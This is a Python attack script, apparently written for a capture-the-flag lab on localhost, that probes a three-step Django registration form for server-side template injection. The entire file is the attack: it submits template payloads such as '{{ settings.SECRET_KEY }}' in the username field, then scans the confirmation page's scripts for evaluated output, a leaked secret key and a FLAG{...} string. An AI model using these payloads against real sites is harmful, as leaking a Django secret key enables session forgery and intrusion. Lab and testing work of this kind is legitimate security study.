import requests
import re
from html.parser import HTMLParser

# Target configuration
BASE_URL = "http://127.0.0.1:32896"
REGISTER_STEP1 = f"{BASE_URL}/accounts/register/step1/"
REGISTER_STEP2 = f"{BASE_URL}/accounts/register/step2/"
REGISTER_STEP3 = f"{BASE_URL}/accounts/register/step3/"

# Initialize session with provided cookies
session = requests.Session()
session.cookies.set("csrftoken", "LdrXRl8e00koJnMqetC83VYf7Us4Ec65", domain="127.0.0.1", path="/")

# SSTI test payloads
payloads = [
    ("{{ 7*7 }}", "49"),  # Basic arithmetic - should evaluate to 49
    ("{{ 7*'7' }}", "7777777"),  # String multiplication - should evaluate to 7777777
    ("{{ settings.SECRET_KEY }}", None),  # Django secret key access
]

def extract_csrf_token(html):
    """Extract CSRF token from HTML response"""
    match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    # Try alternative pattern
    match = re.search(r'csrfmiddlewaretoken["\']?\s*[:\s]+["\']?([^"\'}\s]+)', html)
    if match:
        return match.group(1)
    return None

def extract_javascript_content(html):
    """Extract all JavaScript content from HTML"""
    # Find all script tags and their content
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
    return scripts

def test_ssti_payload(payload, expected_result):
    """Test a single SSTI payload through the 3-step registration"""
    print(f"\n{'='*80}")
    print(f"[*] Testing payload: {payload}")
    print(f"[*] Expected result: {expected_result if expected_result else 'Django SECRET_KEY or error'}")
    print(f"{'='*80}\n")
    
    # Step 1: Initial registration
    print(f"[+] Step 1: POST {REGISTER_STEP1}")
    resp1 = session.get(REGISTER_STEP1)
    csrf_token = extract_csrf_token(resp1.text)
    
    if not csrf_token:
        print(f"[!] Could not extract CSRF token from step 1")
        print(f"[!] Response text sample: {resp1.text[:500]}")
        return
    
    print(f"[+] Extracted CSRF token: {csrf_token[:20]}...")
    
    # POST step 1 with payload in username
    step1_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': payload,
        'email': 'test@test.com',
        'password1': 'TestPass123',
        'password2': 'TestPass123'
    }
    
    resp1_post = session.post(REGISTER_STEP1, data=step1_data, allow_redirects=False)
    print(f"[+] Status: {resp1_post.status_code} | Redirect: {resp1_post.headers.get('Location', 'None')}")
    
    if resp1_post.status_code not in [200, 302]:
        print(f"[!] Unexpected status code at step 1")
        print(f"[!] Response: {resp1_post.text[:1000]}")
        return
    
    # Step 2: Bio and favorite artist
    print(f"\n[+] Step 2: POST {REGISTER_STEP2}")
    resp2 = session.get(REGISTER_STEP2)
    csrf_token = extract_csrf_token(resp2.text)
    
    if not csrf_token:
        print(f"[!] Could not extract CSRF token from step 2")
        return
    
    step2_data = {
        'csrfmiddlewaretoken': csrf_token,
        'bio': 'test bio',
        'favorite_artist': 'test artist'
    }
    
    resp2_post = session.post(REGISTER_STEP2, data=step2_data, allow_redirects=False)
    print(f"[+] Status: {resp2_post.status_code} | Redirect: {resp2_post.headers.get('Location', 'None')}")
    
    # Step 3: Confirmation page - check JavaScript
    print(f"\n[+] Step 3: GET {REGISTER_STEP3}")
    resp3 = session.get(REGISTER_STEP3)
    print(f"[+] Status: {resp3.status_code} | Length: {len(resp3.text)}B")
    
    # Extract and analyze JavaScript
    scripts = extract_javascript_content(resp3.text)
    print(f"\n[+] Found {len(scripts)} script blocks")
    
    ssti_detected = False
    
    for i, script in enumerate(scripts):
        script_clean = script.strip()
        if script_clean and len(script_clean) > 10:  # Skip empty or tiny scripts
            print(f"\n[+] Script block {i+1}:")
            print(f"--- START SCRIPT ---")
            print(script_clean)
            print(f"--- END SCRIPT ---")
            
            # Check if payload is in the script
            if payload in script_clean:
                print(f"\n[!] PAYLOAD FOUND LITERALLY in script: {payload}")
                print(f"[!] NOT EVALUATED - No SSTI")
            
            # Check if expected result is in the script (payload was evaluated)
            if expected_result and expected_result in script_clean:
                print(f"\n[!!!] SSTI DETECTED - Payload evaluated to: {expected_result}")
                print(f"[!!!] Original payload: {payload}")
                ssti_detected = True
            
            # Check for SECRET_KEY pattern
            secret_key_match = re.search(r'[a-zA-Z0-9@#$%^&+=]{40,}', script_clean)
            if secret_key_match and 'SECRET_KEY' in payload:
                potential_key = secret_key_match.group(0)
                if len(potential_key) > 30:  # Django SECRET_KEY is typically 50 chars
                    print(f"\n[!!!] POTENTIAL SECRET_KEY EXPOSED: {potential_key}")
                    ssti_detected = True
    
    # Also check the full HTML for payload/result
    print(f"\n[+] Checking full HTML response...")
    if expected_result and expected_result in resp3.text:
        print(f"[!!!] Expected result '{expected_result}' found in HTML")
        # Show context around the result
        idx = resp3.text.find(expected_result)
        context_start = max(0, idx - 100)
        context_end = min(len(resp3.text), idx + len(expected_result) + 100)
        print(f"[+] Context: ...{resp3.text[context_start:context_end]}...")
        ssti_detected = True
    
    if 'SECRET_KEY' in payload:
        # Look for long alphanumeric strings that might be the secret key
        long_strings = re.findall(r'[a-zA-Z0-9@#$%^&*+=\-_!]{40,}', resp3.text)
        if long_strings:
            print(f"[+] Long strings found (potential SECRET_KEY): {long_strings}")
    
    # Check for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', resp3.text)
    if flag_match:
        print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}")
    
    return ssti_detected

# Test each payload
results = {}
for payload, expected in payloads:
    try:
        detected = test_ssti_payload(payload, expected)
        results[payload] = detected
    except Exception as e:
        print(f"\n[!] Error testing payload '{payload}': {e}")
        import traceback
        traceback.print_exc()
        results[payload] = False

# Summary
print(f"\n\n{'='*80}")
print(f"SUMMARY")
print(f"{'='*80}")
for payload, detected in results.items():
    status = "SSTI DETECTED" if detected else "Not vulnerable"
    print(f"Payload: {payload:<30} | Result: {status}")

